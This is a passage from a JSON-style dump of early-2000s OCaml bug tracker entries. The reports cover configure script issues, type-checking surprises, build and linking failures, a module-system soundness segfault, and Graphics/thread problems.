Peter.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1977\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\ndans le configure (de la version CVS courante), dans la partie testant\nl'architecture pour le backend de Num, je vois:\n\n  i[3456]86-*-*) bng_arch=ia32\n                 if `sh ./trycompile ia32sse2.c`\n                 then bng_asm_level=2\n                 else bng_asm_level=1\n                 fi;;\n\nÃa ne devrait pas plutÃ´t Ãªtre :\n\n  if sh ./trycompile ia32sse2.c\n\n(c-a-d sans les backquotes) ?\n\n-- \n   Olivier\n"},{"labels":["bug"],"text":"**Original bug ID:** 1976\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Mikhail Zabelin\nVersion: OCaml 3.07pl2 native Win32 port (MinGW)\nOS: Win2000\nSubmission from: www-proxy.ioffe.rssi.ru (194.85.224.35)\n\n\nsource file f.ml:\n======================\nlet a = fun x -> x = [] in\nlet b = ref a in\nb := (fun x -> x = [1.0]);\nb := a;\nignore (a [1]);\nignore (!b [1])\n======================\n\ncompile:\n======================\n>ocamlc f.ml\nFile \"f.ml\", line 6, characters 12-13:\nThis expression has type int but is here used with type float\n======================\n"},{"labels":["bug"],"text":"**Original bug ID:** 1975\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: StÃ©phane Legrand\nVersion: 3.07+2\nOS: FreeBSD\nSubmission from: lns-th2-4f-81-56-223-84.adsl.proxad.net (81.56.223.84)\n\n\nBonjour,\n\nAvec le mini-patch trivial ci-dessous, la compilation du compilateur natif sous\nFreeBSD/AMD64 \"passe\" sans problÃ¨me. J'ai fait quelques tests trÃ¨s basiques et\nje n'ai pas constatÃ© d'erreur avec les exÃ©cutables natifs gÃ©nÃ©rÃ©s.\n\nVersion FreeBSD : 5.2-CURRENT\nMachine : Rioworks HDAMA - 2 x 1.8GHz Opteron 244, 8 Go de mÃ©moire\n\nDiff sur le fichier \"configure\" : \n\n--- configure.orig      Fri Dec 12 08:01:42 2003\n+++ configure   Fri Dec 12 07:59:31 2003\n@@ -559,6 +559,7 @@\n   powerpc-*-darwin*)            arch=power; model=ppc; system=rhapsody;;\n   arm*-*-linux*)                arch=arm; system=linux;;\n   ia64-*-linux*)                arch=ia64; system=linux;;\n+  amd64-*-freebsd*)            arch=amd64; system=freebsd;;\n   x86_64-*-linux*)              arch=amd64; system=linux;;\n esac\n"},{"labels":["bug"],"text":"**Original bug ID:** 1974\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Sami MÃ¤kelÃ¤\nVersion: 3.06\nOS: linux\nSubmission from: glubimox.yok.utu.fi (130.232.134.107)\n\n\nI don't know if this is fixed in 3.07, but\nUNIX open call might block, at least when\nopening named pipes. So I think the C interface\nshould have enter_blocking_section() and \nleave_blocking_section().\n"},{"labels":["bug"],"text":"**Original bug ID:** 1973\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Marcon Giulio\nVersion: OCaml 3.0.7\nOS: win32-mingw\nSubmission from: matteo.dsi.unive.it (157.138.20.36)\n\n\nIt seems that ocamlopt under MinGW has some problems with long command lines.\n\nrunning this command:\n> ocamlopt -o 2h2p.exe -I . -I src unix.cmxa graphics.cmxa src/arghandle.cmx\nsrc/edgeDetector.cmx src/edge.cmx src/error.cmx src/math.cmx\nsrc/progressNotifier.cmx src/symmetricMatrix.cmx src/utils.cmx src/edgel.cmx\nsrc/image.cmx src/meanFieldAnnealing.cmx src/ps.cmx src/gfx.cmx\nsrc/interactionCoefficients.cmx src/netpbm.cmx src/main.cmx\n\nproduces this error:\n==\ngcc: @c:\\tmp\\camlresp??????: Invalid argument\nError during linking\n==\n\nwith the -pack option there's a similar error:\n==\nld: cannot open @c:\\tmp\\camlresp??????: Invalid argument\nError during partial linking\n==\n"},{"labels":["bug"],"text":"**Original bug ID:** 1970\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Christopher Zimmermann\nVersion: 3.04\nOS: GNU/Linux\nSubmission from: p50842e30.dip0.t-ipconnect.de (80.132.46.48)\n\n\nThis is a wishlist bug.\n\nHello, \n\nI was just trying to program the game \"pong\". But the graphics module is just\ntoo slow to do this. Try the following code on a Pentium 166 and you'll see that\nit displays only about every second frame:\n\nGraphics.open_graph \" 300x225\";;\nGraphics.set_window_title \"Pong\";;\nGraphics.set_line_width 0;;\nGraphics.auto_synchronize false;;\n\nlet sleepf x = let y = Unix.gettimeofday () +. x in\nwhile y > Unix.gettimeofday () do () done;;\n\n(*let usleep timeout = sleepf timeout;;*)\nlet usleep timeout =\n  let t1 = Unix.gettimeofday () in\n  let to_wait = ref timeout in\n  while !to_wait > 0. do\n    try ignore (Unix.select [] [] [] !to_wait) ; to_wait := 0.\n    with Unix.Unix_error (Unix.EINTR, _, _) ->\n      to_wait := t1 +. timeout -. Unix.gettimeofday ()\n  done;;\n\nlet x = ref 50 and y = ref 51 and mx = ref 1 and my = ref 1\nand time = ref (Unix.gettimeofday ()) in\nwhile true do\n  if !x > 290 && !mx > 0 then mx := 0 - !mx else\n  if !x < 10 && !mx < 0 then mx := 0 - !mx;\n  if !y > 215 && !my > 0 then my := 0 - !my else\n  if !y < 10 && !my < 0 then my := 0 - !my;\n  x := !x + !mx;\n  y := !y + !my;\n  time := !time +. 0.005;\n  if !time -. Unix.gettimeofday () > 0.\n  then begin\n  usleep (!time -. Unix.gettimeofday ());\n(*  Graphics.clear_graph ();*)\n  Graphics.plot !x !y;\n(*  Graphics.fill_circle !x !y 10;*)\n  Graphics.synchronize ();\n  end;\ndone;;\n\nAs you see an usleep function is also missing.\n\nI hope this helps improving OCaml, \nChristopher Zimmermann\n"},{"labels":["bug"],"text":"**Original bug ID:** 1969\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.07+2\nOS: Red Hat Linux\nSubmission from: wasco.cs.caltech.edu (131.215.44.173)\n\n\nMost of the OCaml tools (ocamlc, ocamlmktop, etc) support the -version flag that\ncauses them to print the \"bare\" version string without any extra text (which\nmakes it very useful in Makefiles and other build scripts). It would be nice if\ncamlp4 recognized the -version flag too.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1968\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jacek Chrzaszcz\nVersion: 3.07+2\nOS: Redhat Linux 7.3\nSubmission from: fw-gw-atm.mimuw.edu.pl (193.0.96.15)\n\n\nHello Camlers!\n\nWhile testing Coq modules with some insane examples I discovered \na malicious bug in a dark corner of the Caml module system.\n\n\nJacek\n\n\nmodule type SIG = sig\n  type t\n  type u = t\n  val x:t\n  val f:t->t\n  module M : sig end\nend\n\nmodule N : SIG = struct \n  type t = int \n  type u = int \n  let x = 1 \n  let f y = y+1 \n  module M = struct end\nend\n\nmodule type SIGM = SIG with module M=N\n\nmodule type SIGMt = SIGM with type t=string\n\n(* I suspect that in SIGM (and hence SIGMt) both toplevel t and t in the\nsignature of\n   M (and also u and M.u) have the same ident (name _and_ stamp).  \n\n   Consequently while subtyping the submodule M during \n     SIGMt/Mt <: SIGKILL   below\n   we get t=u wrongly and the subtyping succeeds *)\n\n\nmodule Mt : SIGMt = struct\n  type t = string\n  type u = string\n  let x = \"foo\"\n  let f y = y^\"bar\"\n  module M = N\nend\n\n\n\nmodule type SIGKILL = sig\n  type t\n  type u = t\n  val x:t\n  val f:t->t\n  module M : sig type t = u type u = t val x:t val f:t->t end\nend\n\nmodule K:SIGKILL=Mt\n\n\nlet _ = K.f K.M.x  (* K.f : string -> string,    K.M.x : int *)\n\n\n(* Here: seqfault *)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1967\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Damien Pous\nVersion: 3.07+6 (2003-11-25)\nOS: Debian/GNU Linux\nSubmission from: mailhost.ens-lsh.fr (193.51.131.2)\n\n\nUsing polymorphic variants, the following function  `k' is given a polymorphic\ntype :\n\n# let a = function `A -> 5 | _  -> 0;;\n# let k ?(g = a) () = g `A;;\nval k : ?g:([> `A ] -> int) -> unit -> int = <fun>\n\n# let b = function `A -> 6 | `B -> 7 | _  -> 0;;\n# let _ = k ~g:b ();;\n- : int = 6\n\nBut not when doing the same thing with objects :\n\n# let a = object method a = 5 end;;\n# let k ?(g = a) () = g#a;;\nval k : ?g:< a : int > -> unit -> int = <fun>\n\n# let b = object method a = 6 method b = 7 end;;\n# let _ = k ~g:b ();;\nThis expression has type < a : int; b : int > but is here used with type < a :\nint > \n\n(that's the same using classes)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1963\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Henri Dubois-Ferriere\nVersion: 3.07+2\nOS: RH7.2\nSubmission from: lcavpc14.epfl.ch (128.178.8.51)\n\n\ntest.mli:\ntype a = A | B\n\ntest.ml:\ntype a = B | A\n\nThe compiler complains that type a = A | B is not included in type a = B | A\n\nNot a big deal, but they should be equivalent, no?\n\nA similar problem situation occurse for a record type when the members are not\nlisted in the same order between the .ml and .mli.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1960\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: T. Onoma\nVersion: 3.07pl2\nOS: debian\nSubmission from: adsl-068-209-181-009.sip.mco.bellsouth.net (68.209.181.9)\n\n\n./configure -no-tk still tries to build Labltk.\ni also tried ./configure --no-tk. how do i tell it NO!?\n"},{"labels":["bug"],"text":"**Original bug ID:** 1959\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nJ'ai rÃ©cupÃ©rÃ© la version CVS hier (Ã§a remontait Ã  avant la 3.07).\nJ'ai configurÃ© (cf. plus bas); la seule diffÃ©rence avec la fois\nd'avant Ã©tait:\n   99c99\n   <         target architecture ...... x86\n   ---\n   >         target architecture ...... ia32 (asm level 2)\nÃa plante ici:\n   make[1]: Entering directory `/afs/.inria.fr/common/usr/local/adm/src/caml/csl/otherlibs/num'\n   gcc -O -I../../byterun -fno-defer-pop -Wall -Wno-unused -D_FILE_OFFSET_BITS=64 -D_REENTRANT -fPIC -DBNG_ARCH_ia32 -DBNG_ASM_LEVEL=2   -c -o bng.o bng.c\n   /tmp/ccu07YCq.s: Assembler messages:\n   /tmp/ccu07YCq.s:294: Error: no such instruction: `paddq %mm1,%mm0'\n   /tmp/ccu07YCq.s:295: Error: no such instruction: `paddq %mm2,%mm0'\n   /tmp/ccu07YCq.s:350: Error: no such instruction: `psubq %mm0,%mm1'\n   /tmp/ccu07YCq.s:351: Error: no such instruction: `psubq %mm2,%mm1'\n   /tmp/ccu07YCq.s:410: Error: no such instruction: `paddq %mm1,%mm0'\n   /tmp/ccu07YCq.s:411: Error: no such instruction: `paddq %mm2,%mm0'\n   /tmp/ccu07YCq.s:505: Error: no such instruction: `paddq %mm6,%mm1'\n   /tmp/ccu07YCq.s:507: Error: no such instruction: `psubq %mm2,%mm1'\n   /tmp/ccu07YCq.s:508: Error: no such instruction: `paddq %mm1,%mm0'\n   make[1]: *** [bng.o] Error 1\n   make[1]: Leaving directory `/afs/.inria.fr/common/usr/local/adm/src/caml/csl/otherlibs/num'\n   make: *** [otherlibraries] Error 2\nJe joins le log de configure.  Que faut-il que je fournisse en plus\npour aider Ã  la reproduction du problÃ¨me ?\n\nLa machine a Linux RH 7.1, le compilo est un gcc-2.95.2.\n\nBruno.\n\ncd /afs/.inria.fr/common/usr/local/adm/src/caml/csl/\n./configure -prefix /usr/local/adm/src/caml\nConfiguring for a i686-pc-linux-gnu ...\ngcc found\nThe C compiler is ANSI-compliant.\nChecking the sizes of integers and pointers...\nOK, this is a regular 32 bit architecture.\n64-bit \"long long\" integer type found (printf with \"%ll\").\nThis is a little-endian architecture.\nDoubles can be word-aligned.\n64-bit integers can be word-aligned.\nNative division and modulus have round-towards-zero semantics, will use them.\nobjcopy and nm found in /usr/bin\nranlib found\n#! appears to work in shell scripts\nPOSIX signal handling found.\nstrerror() found.\ntimes() found.\ntermcap functions found (with libraries '-lcurses')\nYou have BSD sockets.\nsocklen_t is defined in <sys/socket.h>\ninet_aton() found.\nunistd.h found.\noff_t is defined in <sys/types.h>\ndirent.h found.\nrewinddir() found.\nlockf() found.\nmkfifo() found.\ngetcwd() found.\ngetwd() found.\ngetpriority() found.\nutime() found.\nutimes() found.\ndup2() found.\nfchmod() found.\ntruncate() found.\nsys/select.h found.\nselect() found.\nsymlink() found.\nwaitpid() found.\nwait4() found.\ngetgroups() found.\nPOSIX termios found.\nAsynchronous I/O are supported.\nsetitimer() found.\ngethostname() found.\nuname() found.\ngettimeofday() found.\nmktime() found.\nsetsid() found.\nputenv() found.\nsetlocale() and <locale.h> found.\ndlopen() found in -ldl.\nDynamic loading of shared libraries is supported.\nmmap() found.\ngethostbyname_r() found (with 6 arguments).\ngethostbyaddr_r() found (with 8 arguments).\nReplay debugger supported.\nSystem stack overflow can be detected.\nPOSIX threads library supported.\nOptions for linking with POSIX threads: -lpthread\nsigwait() found\nBytecode threads library supported.\nLocation of X11 include files: /usr/X11R6/include/X11\nOptions for linking with X11: -L/usr/X11R6/lib -lX11\nNDBM found (in /usr/include/db1)\nConfiguring LablTk...\ntcl.h version 8.3 found with \"\".\ntk.h found.\nTcl/Tk libraries found.\n\n** Configuration summary **\n\nDirectories where Objective Caml will be installed:\n        binaries.................. /usr/local/adm/src/caml/bin\n        standard library.......... /usr/local/adm/src/caml/lib/ocaml\n        manual pages.............. /usr/local/adm/src/caml/man (with extension .1)\nConfiguration for the bytecode compiler:\n        C compiler used........... gcc\n        options for compiling..... -fno-defer-pop -Wall -Wno-unused -D_FILE_OFFSET_BITS=64 -D_REENTRANT\n        options for linking.......  -Wl,-E  -lm  -ldl -lcurses -lpthread\n        shared libraries are supported\n        options for compiling..... -fPIC -fno-defer-pop -Wall -Wno-unused -D_FILE_OFFSET_BITS=64 -D_REENTRANT\n        command for building...... gcc -shared -o lib.so -Wl,-rpath,/a/path objs\nConfiguration for the native-code compiler:\n        hardware architecture..... i386\n        OS variant................ linux_elf\n        C compiler used........... gcc\n        options for compiling..... -Wall -Wno-unused -D_FILE_OFFSET_BITS=64 -D_REENTRANT\n        options for linking.......   -lm\n        assembler ................ $(AS) \n        preprocessed assembler ... gcc -c -DSYS_$(SYSTEM)\n        profiling with gprof ..... supported\n        ocamlopt -pack ........... supported\nSource-level replay debugger: supported\nAdditional libraries supported:\n        unix str num dynlink bigarray systhreads threads graph dbm labltk\nConfiguration for the \"num\" library:\n        target architecture ...... ia32 (asm level 2)\nConfiguration for the \"graph\" library:\n        options for compiling .... -I/usr/X11R6/include\n        options for linking ...... -L/usr/X11R6/lib -lX11\nConfiguration for the \"labltk\" library:\n        use tcl/tk version ....... 8.3\n        options for compiling .... \n        options for linking ......  -ltk8.3 -ltcl8.3  -ldl\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 1956\n**Reporter:** administrator\n**Assigned to:** @damiendoligez\n**Status:** acknowledged (set by @damiendoligez on 2007-11-19T18:09:46Z)\n**Resolution:** open\n**Priority:** high\n**Severity:** minor\n**Category:** runtime system and C interface\n**Related to:** #8356 #4164 #4230 #4877 #5254 #6126\n**Monitored by:** \"Hendrik Tews\"\n\n## Bug description\n\nHello Lars and caml-bugs,\r\n\r\nThere is a name clash between the libcrypto and libcamlrun on the symbol\r\ncreate_string. This prevents from linking statically an OCaml program that\r\nuses the ocurl library (bindings to the libcurl, which uses libcrypto), and\r\nI guess that horrible things may happen at runtime with dynamic linking.\r\n\r\nSimilar issues have been raised recently on the caml-list (concerning\r\nthe libsamba, libperl, and graphviz libraries).\r\n\r\nAny plan to address these issues?\r\n\r\nOCaml is no more faulty than these libraries, but this is not a reason not\r\nto fix the problem :-)\r\n\r\nA natural solution would be to prefix all the common names like\r\ncreate_string or get_string. To keep the compatibility with existing C\r\ncode that uses Caml C headers, there could be two versions of these\r\nheaders (the compatibility header would #DEFINE create_string as\r\nocaml_create_string and so on).\r\n\r\n\r\n  Alain\n\n## File attachments\n\n- [no-export-marshall-flags.patch](https://gist.githubusercontent.com/vicuna/edf9b110427e573f9951f988eb31715d/raw/0e7160f33a1620eb5e94a0a12786d8a252be139f/no-export-marshall-flags.patch)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1955\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Samuel Colin\nVersion: 3.07+2\nOS: Linux\nSubmission from: alille-209-1-12-176.w81-249.abo.wanadoo.fr (81.249.41.176)\n\n\nWhile mixing graphical and threaded programming, I happened to find some strange\nbugs. First, here is a piece of code for you to test:\n(**************)\nopen Graphics\n\n\nlet inputThread ()=\n  let gotEvent=Graphics.wait_next_event [Graphics.Button_down] in\n    print_endline (\"mouse:\" ^ (string_of_int gotEvent.mouse_x) \n\t\t   ^ \",\" ^ (string_of_int gotEvent.mouse_y));\n    flush stdout\n\n\nlet _=\n  Graphics.open_graph \"\";\n  let t=Thread.create inputThread () in\n  let tid=Thread.id t in\n    Thread.join t;\n    Graphics.close_graph ()\n(***************)\n\nCompilations are made with:\nocamlc -o test -thread unix.cma threads.cma graphics.cma test.ml\nand\nocamlopt -o test -thread unix.cmxa threads.cmxa graphics.cmxa test.ml\n\nBugs found:\n\n-Bytecode : \nscolin@hebus:~/tmp/test$ ./test \nmouse:31,269\nscolin@hebus:~/tmp/test$ ./test \nmouse:280,222\nErreur de segmentation\n\nThe second execution makes a segmentation fault (maybe does it come from the OS,\nbut I'm not sure).\nAnd replacing \"Thread.join t\" with \"ignore (Thread.wait_pid tid)\" yields:\nscolin@hebus:~/tmp/test$ ./test \nFatal error: exception Unix.Unix_error(5, \"waitpid\", \"\")\n\nGiven the documentation of the thread library, maybe the Graphics library should\nbe compiled with the \"-thread\" option?\n\nThe second bug comes from the Graphics library used in conjunction with the\nThread library (doesn't happen if the code of the inputThread function is put\ndirectly in the \"main\" function):\n-Bytecode : the event is detected, the mouse position is returned as expected\n-Native code : the event is not detected, so the program doesn't end.\nAdding Graphics.Poll in the list of events solves the problem, but maybe one\ndoesn't want to wait for the Poll event...\n\nSo, maybe all these bugs simply come from the fact that the Graphics library\nisn't thread-safe.\n\nHope this helps...\n"},{"labels":["bug"],"text":"**Original bug ID:** 1954\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi.  I found another case where this happened even with \"-linkall\"....so\nI now don't have an effective workaround.\n\nA little bit of stats for you.   We run our o'caml based model checker\non about 900 real-world benchmarks that require a couple of days to run\non about 4 machines.   On those benchmarks this occurs about 3 times\nwhen running on the 900 benchmarks.  \n\nOn another set of small C programs (about 200 cases, that require about\nan hour to run) that we're running on it happens on one benchmark.  \n\nThe problem w/ this bug is that _any_ change in the code can cause it to\ngo away on one benchmark but often appear in another place.  Its really\nquite hard to predict ;-)\n\n- Byron\n \n\n> -----Original Message-----\n> From: Byron Cook \n> Sent: Wednesday, November 26, 2003 12:49 AM\n> To: 'caml-bugs@inria.fr'\n> Subject: Possible bug in \n> \n> Hi,\n> \n> I'm seeing what I think might be a bug in ocamlopt or the \n> ocaml runtime. I'm using \"The Objective Caml native-code \n> compiler, version 3.04, Standard library directory: \n> c:\\ocaml\\lib\"  on Windows XP.\n> \n> My code is setting an alarm in the GC system with \n> Gc.create_alarm.  I then see that (for a very rare and \n> seemingly unrelated set of input files to this program \n> (SLAM), on the first garbage collection, the program core \n> dumps.  this happens even if the function that is being \n> passed to Gc.create_alarm simply prints a string.\n> \n> There seem to be some ways to work around the problem.  Of \n> course if I dont use Gc.create_alarm at all the problem goes \n> away. ;-)  Also, if I pass -linkall to the ocamlopt it seems \n> to go away on the particular case that I'm looking at.  \n> However: its hard to know if this is a real workaround or if \n> its just working in this one case where i'm seeing the problem.\n> \n> Have you all seen this problem before?  If so: what's \n> happening?  If not: is there some secret logging command that \n> I could use to create a dump for you all to look at (if \n> you're interested...)\n> \n> Thanks\n> \n> - Byron \n>\n"},{"labels":["bug"],"text":"**Original bug ID:** 1953\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: john skaller\nVersion: cvs\nOS: \nSubmission from: proxy8.tpgi.com.au (203.26.24.218)\n\n\nmake world.opt \n\n......\n\ncd stdlib; make allopt\nmake[1]: Entering directory `/mnt/local/src/cvsocaml/ocaml/stdlib'\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib -nopervasives -c\npervasives.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c array.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c list.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c char.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c string.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c sys.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c hashtbl.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c sort.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c marshal.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c obj.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c int32.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c int64.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c nativeint.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c lexing.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c parsing.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c set.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c map.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c stack.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c queue.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c stream.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c buffer.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c printf.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c format.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c scanf.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c arg.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c printexc.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c gc.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c digest.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c random.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c callback.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib -inline 0\ncamlinternalOO.mlCannot find file std_exit.cmx\nmake[1]: *** [camlinternalOO.cmx] Error 2\nmake[1]: Leaving directory `/mnt/local/src/cvsocaml/ocaml/stdlib'\nmake: *** [libraryopt] Error 2\n"},{"labels":["bug"],"text":"**Original bug ID:** 1948\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n(ocaml 3.07pl2, Linux RH9.0)\n\nJe compile:\n   /usr/local/bin/ocamlc-3.07 -warn-error A -g -pp \"/usr/local/bin/camlp4r-3.07 -I .\" -I /afs/.inria.fr/common/usr/local/src/ocaml-3.07 -I /afs/.inria.fr/common/usr/local/src/ocaml-3.07/utils -I /usr/local/lib/ocaml-3.07/caml -I . -I +contrib -I /usr/local/lib/ocaml-3.07/site-lib/pcre -I /usr/local/lib/ocaml-3.07/camlp4 -c move-log.ml\n   time /usr/local/bin/ocamlc-3.07 -g -dllpath /usr/local/lib/ocaml-3.07/contrib -dllpath /usr/local/lib/ocaml-3.07/site-lib/pcre -I . -I +contrib -I /usr/local/lib/ocaml-3.07/site-lib/pcre -I /usr/local/lib/ocaml-3.07/camlp4 unix.cma pcre.cma camlp4.cma cstr.cma cash.cma move-log.cmo -o move-log\n\nJ'exÃ©cute:\n   OCAMLRUNPARAM=b sr ./move-log \n   Fatal error: exception Invalid_argument(\"String.get\")\n   Raised by primitive operation at file \"\", line 1, character 4134\n   Called from file \"\", line 1, character 4286\n   Called from file \"\", line 1, character 1703\n   Called from file \"\", line 1, character 1811\n   Called from file \"list.ml\", line 57, character 27\n   Called from file \"\", line 1, character 4492\n   Called from unknown location\n   Called from file \"\", line 1, character 4765\n\nQu'ai-je fait pour ne pas avoir les noms des fichiers ?  ocamldebug\nfonctionne correctement, donc je ne pense pas avoir oubliÃ© de -g.  Et\nles fichiers \"\" viennent indiffÃ©remment de move-log.cmo, cstr.cma et\ncash.cma (au moins).\n\nBruno.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1946\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Lars Nilsson\nVersion: CVS HEAD\nOS: RedHat Linux 7.2\nSubmission from: host-64-179-106-232.ind.choiceone.net (64.179.106.232)\n\n\n1 ./configure -prefix ~/local/ocaml\n2. make world\n3. make bootstrap\n4. make opt\n\nThe 'make opt' step fails with\n\ncd stdlib; make allopt\nmake[1]: Entering directory `/home/lars/Playground/ocaml/stdlib'\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib -nopervasives -c\npervasives.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c array.ml\n[Removed for brevity]\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib  -c callback.ml\n../boot/ocamlrun ../ocamlopt -warn-error A -nostdlib -inline 0\ncamlinternalOO.ml\nCannot find file std_exit.cmx\nmake[1]: *** [camlinternalOO.cmx] Error 2\nmake[1]: Leaving directory `/home/lars/Playground/ocaml/stdlib'\nmake: *** [libraryopt] Error 2\n"},{"labels":["bug"],"text":"**Original bug ID:** 1945\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi,\n\nI'm seeing what I think might be a bug in ocamlopt or the ocaml runtime.\nI'm using \"The Objective Caml native-code compiler, version 3.04,\nStandard library directory: c:\\ocaml\\lib\"  on Windows XP.\n\nMy code is setting an alarm in the GC system with Gc.create_alarm.  I\nthen see that (for a very rare and seemingly unrelated set of input\nfiles to this program (SLAM), on the first garbage collection, the\nprogram core dumps.  this happens even if the function that is being\npassed to Gc.create_alarm simply prints a string.\n\nThere seem to be some ways to work around the problem.  Of course if I\ndont use Gc.create_alarm at all the problem goes away. ;-)  Also, if I\npass -linkall to the ocamlopt it seems to go away on the particular case\nthat I'm looking at.  However: its hard to know if this is a real\nworkaround or if its just working in this one case where i'm seeing the\nproblem.\n\nHave you all seen this problem before?  If so: what's happening?  If\nnot: is there some secret logging command that I could use to create a\ndump for you all to look at (if you're interested...)\n\nThanks\n\n- Byron\n"},{"labels":["bug"],"text":"**Original bug ID:** 1944\n**Reporter:** administrator\n**Status:** closed (set by @damiendoligez on 2007-12-12T15:20:54Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #8384 #8445\n\n## Bug description\n\nRichard Jones wrote:\r\n> It's only 140 lines of code? Try chopping lines off the end of the\r\n> file until the thing compiles. Then you should be able to isolate\r\n> which statement causes the stack overflow. From there it should be a\r\n> simple enough job to either understand the problem and work around it,\r\n> or else come up with a minimal example which exhibits the bug.\r\n> \r\n> Rich.\r\n> \r\n\r\nI don't need to chop off lines of code. I know exactly what line of code \r\ncauses the problem. Let me quote it to you:\r\n\r\n > let cont f init res execute =\r\n >   Local_rules.Rewrite.rewrite_continuation rule_base (cont f)\r\n\r\nLet me try to explain the dependency relations in my libraries. You will \r\nsee that it is 